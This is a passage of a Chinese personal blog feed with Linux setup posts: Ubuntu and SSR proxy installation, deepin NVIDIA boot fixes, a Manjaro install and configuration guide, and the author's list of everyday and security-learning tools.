gcc等编译工具</span></span><br><span class="line">sudo apt <span class="keyword">install </span><span class="keyword">build-essential</span></span><br><span class="line"><span class="keyword"># </span><span class="keyword">jdk</span></span><br><span class="line"><span class="keyword">sudo </span>apt <span class="keyword">install </span>openjdk-8-<span class="keyword">jdk</span></span><br><span class="line"><span class="keyword"># </span>cmake</span><br><span class="line">sudo apt <span class="keyword">install </span>cmake</span><br></pre></td></tr></table></figure><h3 id="3-酸酸乳"><a href="#3-酸酸乳" class="headerlink" title="3.酸酸乳"></a>3.酸酸乳</h3><blockquote><p>什么是酸酸乳？<br>shadowsocksR，可以登录你的vpn，其余我就不便多说了</p></blockquote><p>第一步：下载客户端</p><p><code>https://github.com/erguotou520/electron-ssr/releases</code></p><p>第二步：安装（这里以Ubuntu/Deepin Linux为例）</p><p>进入到客户端保存文件目录，安装指令如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">dpkg</span> <span class="selector-tag">-i</span> <span class="selector-tag">electron-ssr_0</span><span class="selector-class">.2</span><span class="selector-class">.6_amd64</span><span class="selector-class">.deb</span></span><br></pre></td></tr></table></figure><p>出现依赖问题：<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> -f</span><br></pre></td></tr></table></figure></p><p>正常运行electron-ssr即可下载酸酸乳<br>配置完后，记得设置下系统网络代理：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g20f17tpj2j316b0kqgse.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本篇简单介绍一下，刚装好的Ubuntu系统需要配置的选项及常用软件安装。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="ubuntu" scheme="http://qymua.com/tags/ubuntu/"/>
    
      <category term="linux" scheme="http://qymua.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>deepin入坑前必读(懊悔篇)</title>
    <link href="http://qymua.com/2019/04/08/deepin%E5%85%A5%E5%9D%91%E5%89%8D%E5%BF%85%E8%AF%BB-%E6%87%8A%E6%82%94%E7%AF%87/"/>
    <id>http://qymua.com/2019/04/08/deepin入坑前必读-懊悔篇/</id>
    <published>2019-04-07T16:33:37.000Z</published>
    <updated>2019-08-10T08:32:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="因NVIDIA显卡造成开机启动问题"><a href="#因NVIDIA显卡造成开机启动问题" class="headerlink" title="因NVIDIA显卡造成开机启动问题"></a>因NVIDIA显卡造成开机启动问题</h2><blockquote><p>此问题与版本无关，是显卡的通病</p></blockquote><p><strong>第一步：暂时性解决方案，能开机，但是重启后问题依然存在</strong></p><p>1）开机后按<code>e</code>，进入启动配置编辑页面</p><p>2）然后我们在菜单中的代码中，找到倒数第二行，会出现如下所示的代码：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux /vmlinuz<span class="number">-4.15</span><span class="number">.0</span><span class="number">-29</span>deepin-generic root=UUID=b66d8ffa-aed9<span class="number">-466</span>c-bc12<span class="number">-6</span>bb801e45901 ro splash quiet</span><br></pre></td></tr></table></figure><p>上面这行表示加载linux内核文件，后面是内核的参数，以下为解释：</p><p> <code>root</code>告诉内核根分区的设备；ro表示在设备启动时为<code>read-only</code>，如果是rw表示read-write<br> <code>splash</code>表示开机动画splash表示开机动画<br> <code>quiet</code>表示在启动过程中只有重要信息显示，类似硬件自检的消息不会显示quiet表示在启动过程中只有重要信息显示，类似硬件自检的消息不会显示<br> single以单用户模式登录，一般用于修改系统，比如deepin密码忘记了等等。single以单用户模式登录，一般用于修改系统，比如deepin密码忘记了等等。</p><p>3）在quiet的后面空一格加上如下所示的代码：<code>acpi_osi=! acpi=&quot;windows 2009&quot;</code>，然后按<code>F10</code>保存即可。这时会重新开始登录deepin系统，耐心等待进入桌面即可。</p><p><strong>第二步：永久性解决方案，进入系统后修改配置</strong></p><p>1）开机后输入账号和密码，若进入桌面鼠标一直转圈圈，请看下面的解决方案，如果一切正常，则继续操作；</p><p>2）按Ctrl+Alt+T进入打开终端，输入以下代码来打开grub配置文件：<code>sudo gedit /boot/grub/grub.cfg</code>，如下图所示：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g1zxc3d4lbj30zc0g17io.jpg" alt></p><p>3）成功后会打开你的<code>grub.cfg</code>文件，如图所示，然后按Ctrl+F搜索quiet，并在第<code>第一个quiet</code>后面空一格加上这行代码：<code>acpi_osi=! acpi=&quot;windows 2009&quot;</code>，并保存退出。</p><p>问题到这里应该就能得到永久解决了！</p><blockquote><p>kali也有类似的显卡问题无法开机，原理大致相同。</p></blockquote><p>第一步：先想办法进入系统，临时解决方法：进入启动项编辑，在倒数第三行加入了<code>nouveau.modeset=0</code><br>第二步：永久性解决：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 将nouveau添加到黑名单，防止它启动</span><br><span class="line">cd <span class="regexp">/etc/</span>modprobe.d $ sudo vi nvidia-graphics-drivers.conf  <span class="comment">//写入：blacklist nouveau</span></span><br><span class="line">cat nvidia-graphics-drivers.conf     <span class="comment">//检查</span></span><br><span class="line"><span class="number">2.</span> 对于：<span class="regexp">/etc/</span><span class="keyword">default</span>/grub，添加到末尾。</span><br><span class="line">sudo vi <span class="regexp">/etc/</span><span class="keyword">default</span><span class="regexp">/grub   /</span>/末尾写入：rdblacklist=nouveau nouveau.modeset=<span class="number">0</span></span><br><span class="line">cat <span class="regexp">/etc/</span><span class="keyword">default</span><span class="regexp">/grub   /</span>/检查</span><br></pre></td></tr></table></figure></p><p>执行官方提供的操作，不成功也没事<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo mv /boot/initramfs-<span class="variable">$(</span>uname -r).img /boot/initramfs-<span class="variable">$(</span>uname -r)-nouveau.img</span><br><span class="line">然后重新生成initrd文件</span><br><span class="line"><span class="variable">$ </span>sudo dracut /boot/initramfs-<span class="variable">$(</span>uname -r).img <span class="variable">$(</span>uname -r) <span class="variable">$ </span>sudo update-initramfs -u</span><br></pre></td></tr></table></figure></p><h2 id="显示设置旋转后导致开机黑屏"><a href="#显示设置旋转后导致开机黑屏" class="headerlink" title="显示设置旋转后导致开机黑屏"></a>显示设置旋转后导致开机黑屏</h2><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g1zxcj55f3j30dt0ekmzc.jpg" alt></p><p>这是一个坑，切记不用去点</p><p>如果中枪了，可以使用以下解决方案：<br>开机进入用户登录界面，ctrl+alt+F1-f7</p><p>执行以下命令</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv ~/.<span class="built_in">config</span>/deepin/startdde/<span class="built_in">display</span>.json /</span><br></pre></td></tr></table></figure><p>reboot重启下就可以进入系统了，之后你再去找到这个配置文件，修改<code>Rotation</code>的值为<code>1</code>，再mv回去就好了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;因NVIDIA显卡造成开机启动问题&quot;&gt;&lt;a href=&quot;#因NVIDIA显卡造成开机启动问题&quot; class=&quot;headerlink&quot; title=&quot;因NVIDIA显卡造成开机启动问题&quot;&gt;&lt;/a&gt;因NVIDIA显卡造成开机启动问题&lt;/h2&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="随笔" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="linux" scheme="http://qymua.com/tags/linux/"/>
    
      <category term="deepin" scheme="http://qymua.com/tags/deepin/"/>
    
  </entry>
  
  <entry>
    <title>manjaro  linux 安装及使用</title>
    <link href="http://qymua.com/2019/04/07/manjaro-linux-%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <id>http://qymua.com/2019/04/07/manjaro-linux-安装及使用/</id>
    <published>2019-04-07T12:18:46.000Z</published>
    <updated>2019-08-10T09:05:37.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一直想找个适合学习二进制的稳定的第二系统，windows是不可能不要的，配合VMware+linux子系统，还是棒棒的！就是不太稳定，譬如不小心中病毒之类的，爱折腾的我，找个备用系统还是很有必要的。只是为了更专注的学习这块内容，鄙人想着折腾一下。从deepin到kubuntu，还是更青睐基于arch的manjaro，什么都有的AUR，KDE桌面兼容得最好的发行版本，内核共存，版本回退，还有各种IT技术党管用的操作技巧，将这一切综合在一起，就它了！当然ubuntu大法也很不错，win底下还是经常用虚拟机开着的昂。<br><a id="more"></a></p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.下载镜像</p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/#" target="_blank" rel="noopener">清华大学开源镜像站</a></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g1zxdfvin9j30c60c93yx.jpg" alt></p><p>2.压缩空闲分区（建议使用固态）</p><p>3.制作启动盘</p><p>有两种方式制作启动盘，利用diskimage选择ios镜像，直接制作</p><p>你也可以选择<a href="http://rufus.akeo.ie/" target="_blank" rel="noopener">rufus</a>  选择<strong>DD</strong>模式写入</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g1zxdokq3hj30gz09oadd.jpg" alt></p><h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><p>我只简单罗列一些安装过程中可能遇到的问题：</p><p>1.manjaro安装比较高级，他进入的是体验版，也就是manjaro try因为是读取启动盘的数据，可能比较慢，毕竟花里胡哨 ，类似PE那种吧</p><p>2.游戏本，也就是双显卡的电脑，需要屏蔽下独显才能进入上述图形化安装界面，方法都一样，修改引导配置，drive=后面的值修改为intel</p><p>安装后需要修改grub.cfg文件，修改每项启动引导配置，在boot参数后添加<code>nouveau.modeset=0</code>参数,解决lspci命令阻塞的问题,这是通法。</p><p>3.重启后进步了linux，即引导问题。进入bios查看boot引导方式，如果是legacy，建议换成UEFI，可能需要重新装机哦，现在的电脑一般都是默认支持UEFI的，它的引导管理还是很舒适的，对于装多系统的人比较友好，如果你执意使用传统的引导方式，建议重新安装manjaro，并在安装选项中，找到引导安装选项，安装到与你windows系统，即默认引导盘相同的硬盘上，重启后你就能顺利进入manjaro的grub引导界面了</p><p>4.Linux与Windows双系统时间错乱问题解决方法</p><p>Windows把系统硬件时间当作本地时间(local time)，即操作系统中显示的时间跟BIOS中显示的时间是一样的。</p><p>Linux/Unix/Mac把硬件时间当作UTC，操作系统中显示的时间是硬件时间经过换算得来的，比如说北京时间是GMT+8，则系统中显示时间是硬件时间+8。而Windows显示的是硬件时间，所以两个时间会发生错乱。</p><p>在 Windows 把硬件时间当作 UTC<br>开 始-&gt;运行-&gt;CMD，打开命令行程序(以管理员方式打开命令行程序方可有权限访问注册表)，在命令行中输入下面命令并回车</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reg add HKLM<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\T</span>imeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure><h2 id="安装后的配置"><a href="#安装后的配置" class="headerlink" title="安装后的配置"></a>安装后的配置</h2><p>1.安装后就可以先配置国内的软件源。使用以下命令，生成可用中国镜像站列表：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-mirrors -<span class="selector-tag">i</span> -c China -m rank</span><br></pre></td></tr></table></figure><p>勾选ping最低的就好了</p><p>2.在 <code>/etc/pacman.conf</code>文件末尾添加一下两行:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[archlinuxcn]</span></span><br><span class="line"><span class="attr">Server</span> = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p>3.安装<code>archlinuxcn-keyring</code>:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo pacman -S archlinuxcn-keyring</span></span><br><span class="line"><span class="attribute">sudo pacman -Syu</span></span><br></pre></td></tr></table></figure><p>4.修改Home下的目录为英文</p><p>修改目录映射文件名；<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.<span class="built_in">config</span>/user-dirs.dirs</span><br></pre></td></tr></table></figure></p><p>修改为以下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">XDG_DESKTOP_DIR</span>=<span class="string">"$HOME/Desktop"</span></span><br><span class="line"><span class="attr">XDG_DOWNLOAD_DIR</span>=<span class="string">"$HOME/Download"</span></span><br><span class="line"><span class="attr">XDG_TEMPLATES_DIR</span>=<span class="string">"$HOME/Templates"</span></span><br><span class="line"><span class="attr">XDG_PUBLICSHARE_DIR</span>=<span class="string">"$HOME/Public"</span></span><br><span class="line"><span class="attr">XDG_DOCUMENTS_DIR</span>=<span class="string">"$HOME/Documents"</span></span><br><span class="line"><span class="attr">XDG_MUSIC_DIR</span>=<span class="string">"$HOME/Music"</span></span><br><span class="line"><span class="attr">XDG_PICTURES_DIR</span>=<span class="string">"$HOME/Pictures"</span></span><br><span class="line"><span class="attr">XDG_VIDEOS_DIR</span>=<span class="string">"$HOME/Videos"</span></span><br></pre></td></tr></table></figure><p>将Home目录下的中文目录名改为对应的中文名；</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line"><span class="keyword">mv</span> 公共 Public</span><br><span class="line"><span class="keyword">mv</span> 模板 Templates</span><br><span class="line"><span class="keyword">mv</span> 视频 Videos</span><br><span class="line"><span class="keyword">mv</span> 图片 Pictures</span><br><span class="line"><span class="keyword">mv</span> 文档 Documents</span><br><span class="line"><span class="keyword">mv</span> 下载 Download</span><br><span class="line"><span class="keyword">mv</span> 音乐 Music</span><br><span class="line"><span class="keyword">mv</span> 桌面 Desktop</span><br></pre></td></tr></table></figure><p>5.安装搜狗拼音</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx-<span class="literal">im</span>    <span class="comment">#默认全部安装</span></span><br><span class="line">sudo pacman -S fcitx-configtool</span><br><span class="line">sudo pacman -S fcitx-sogoupinyin</span><br></pre></td></tr></table></figure><p>新建<code>~/.xprofile</code>文件，加入如下内容<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">GTK_IM_MODULE</span>=fcitx</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">QT_IM_MODULE</span>=fcitx</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">XMODIFIERS</span>=<span class="string">"@im=fcitx"</span></span><br></pre></td></tr></table></figure></p><p>重启后生效</p><h2 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h2><p>先介绍几条pacman的常用命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pacman -S  <span class="comment">#安装</span></span><br><span class="line"></span><br><span class="line">pacman -Syu <span class="comment">#更新源并安装</span></span><br><span class="line"></span><br><span class="line">pacman -U <span class="comment">#安装本地的包</span></span><br><span class="line"></span><br><span class="line">pacman -<span class="keyword">Sc </span><span class="comment">#清理缓存</span></span><br><span class="line"></span><br><span class="line">pacman -R <span class="comment">#卸载</span></span><br></pre></td></tr></table></figure><blockquote><p>sudo pacman -S google-chrome</p><p>sudo pacman -S firefox firefox-i18n-zh-cn</p><p>sudo pacman -S pycharm</p><p>sudo pacman -S yaourt</p><p>sudo pacman -S git</p><p>sudo pacman -S netease-cloud-music</p><p>sudo pacman -S xflux-gui-git</p><p>sudo pacman -S file-roller unrar unzip p7zip</p><p>yaourt -S wps-office</p><p>sudo pacman -S visual-studio-code-bin</p><p>sudo pacman -S flameshot</p></blockquote><p>另外要注意的是，如果你使用ssr，需要在网络连接设置全局代理，否则终端和浏览器无法走代理上网，又或者日常使用chrome的switchyOmega插件来实现pac代理。还有一点，因为我单纯只是用来学习二进制的，所以没有一直纠结于VMware工作站无法正常使用的问题，也尝试解决过，但是网络上的方法貌似都过时了，wiki也没有再更新，VM官方也表示不支持arch，so 如果你需要用到这个工作站，最好别入坑😉</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一直想找个适合学习二进制的稳定的第二系统，windows是不可能不要的，配合VMware+linux子系统，还是棒棒的！就是不太稳定，譬如不小心中病毒之类的，爱折腾的我，找个备用系统还是很有必要的。只是为了更专注的学习这块内容，鄙人想着折腾一下。从deepin到kubuntu，还是更青睐基于arch的manjaro，什么都有的AUR，KDE桌面兼容得最好的发行版本，内核共存，版本回退，还有各种IT技术党管用的操作技巧，将这一切综合在一起，就它了！当然ubuntu大法也很不错，win底下还是经常用虚拟机开着的昂。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="linux" scheme="http://qymua.com/tags/linux/"/>
    
      <category term="manjaro" scheme="http://qymua.com/tags/manjaro/"/>
    
  </entry>
  
  <entry>
    <title>Tools recode</title>
    <link href="http://qymua.com/2019/04/07/Tools-recode/"/>
    <id>http://qymua.com/2019/04/07/Tools-recode/</id>
    <published>2019-04-07T12:10:23.000Z</published>
    <updated>2019-04-30T07:36:38.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本帖永久更新✔</p></blockquote><h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><ul><li>chrome</li><li>Firefox</li><li>Firefox渗透版</li><li>Tor Browser</li><li>sougou Browser</li></ul><h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><ul><li>manjaro linux （第二系统）</li><li>windows 10</li><li>ubuntu 18.04 (虚拟机)</li><li>kali linux (虚拟机)</li><li>52pojie XP (虚拟机)</li><li>commandoVM</li></ul><a id="more"></a><h3 id="Linux工具"><a href="#Linux工具" class="headerlink" title="Linux工具"></a>Linux工具</h3><ul><li>electron-ssr</li><li>flameshot</li></ul><h3 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h3><ul><li>bdcam –录屏</li><li>CamtasiaStudio –高级录屏</li><li>OneNote –MS良心之作</li><li>GitNote–基于git的云笔记</li><li>Typora –Markdown编辑器轻量级</li><li>Atom  –github出品Markdown编辑器</li><li>Eagle –图片管理工具（设计师专用）</li><li>PicGo –最好用的图片上传工具（支持微博、github等各大主流图床）</li><li>xmind –思维导图</li><li>ScreenToGif –gif录制</li><li>Mweb –OS markdown编辑器（博客神器）</li><li>石墨文档</li><li>幕布</li></ul><h3 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h3><ul><li>Visual C++ 6.0</li><li>PyCharm Community Edition</li><li>Visual Studio 2015</li><li>Visual Studio Code</li><li>IntelliJ IDEA</li></ul><h3 id="终端工具"><a href="#终端工具" class="headerlink" title="终端工具"></a>终端工具</h3><ul><li>ConEmu – windows</li><li>Termux  – Android</li><li>Termius – ios</li><li>Termius α</li></ul><h3 id="数据库管理工具"><a href="#数据库管理工具" class="headerlink" title="数据库管理工具"></a>数据库管理工具</h3><ul><li>navicat</li><li>MySQL-Front</li></ul><h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3><ul><li>Notepad++</li><li>sublime_text</li><li>010 Editor</li><li>BCompare</li></ul><h3 id="下载器"><a href="#下载器" class="headerlink" title="下载器"></a>下载器</h3><ul><li>PanDownload</li><li>SpeedPan</li><li>迅雷5</li><li>迅雷简易版</li><li>百度云盘</li><li>油猴</li></ul><h3 id="系统开机启用"><a href="#系统开机启用" class="headerlink" title="系统开机启用"></a>系统开机启用</h3><ul><li>SSR</li><li>火绒安全</li><li>Listary</li><li>Snipaste</li><li>Wox</li><li>Lily</li><li>Everything</li></ul><h3 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h3><ul><li>Teamview 企业版</li><li>TeamView 快速版</li><li>xshell</li><li>flashFXP</li><li>putty</li></ul><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>phpstudy</li><li>VMware Workstation</li><li>java</li><li>python</li><li>C</li><li>node.js</li><li>git</li><li>hexo</li><li>gitbook</li></ul><h3 id="Hacker工具"><a href="#Hacker工具" class="headerlink" title="Hacker工具"></a>Hacker工具</h3><ul><li>pentestBox</li><li>吾爱破解工具包</li><li>小雷草</li><li>心东</li><li>52pj逆向系统</li><li>CTFtools</li><li>pwntools</li></ul><h3 id="办公"><a href="#办公" class="headerlink" title="办公"></a>办公</h3><p>Adobe系列：</p><ul><li>After Effects CC 2019</li><li>Photoshop CC 2019</li><li>Premiere Pro CC 2019</li><li>Adobe Audition CC</li><li>Adobe Fireworks CS6</li><li>Adobe Lightroom Classic CC</li></ul><p>office系列：</p><ul><li>Word</li><li>PowerPoint</li><li>Excel</li><li>Visio</li><li>Project</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本帖永久更新✔&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;浏览器&quot;&gt;&lt;a href=&quot;#浏览器&quot; class=&quot;headerlink&quot; title=&quot;浏览器&quot;&gt;&lt;/a&gt;浏览器&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;chrome&lt;/li&gt;
&lt;li&gt;Firefox&lt;/li&gt;
&lt;li&gt;Firefox渗透版&lt;/li&gt;
&lt;li&gt;Tor Browser&lt;/li&gt;
&lt;li&gt;sougou Browser&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;系统&quot;&gt;&lt;a href=&quot;#系统&quot; class=&quot;headerlink&quot; title=&quot;系统&quot;&gt;&lt;/a&gt;系统&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;manjaro linux （第二系统）&lt;/li&gt;
&lt;li&gt;windows 10&lt;/li&gt;
&lt;li&gt;ubuntu 18.04 (虚拟机)&lt;/li&gt;
&lt;li&gt;kali linux (虚拟机)&lt;/li&gt;
&lt;li&gt;52pojie XP (虚拟机)&lt;/li&gt;
&lt;li&gt;commandoVM&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="tools" scheme="http://qymua.com/tags/tools/"/>
    
  </entry>
  
</feed>
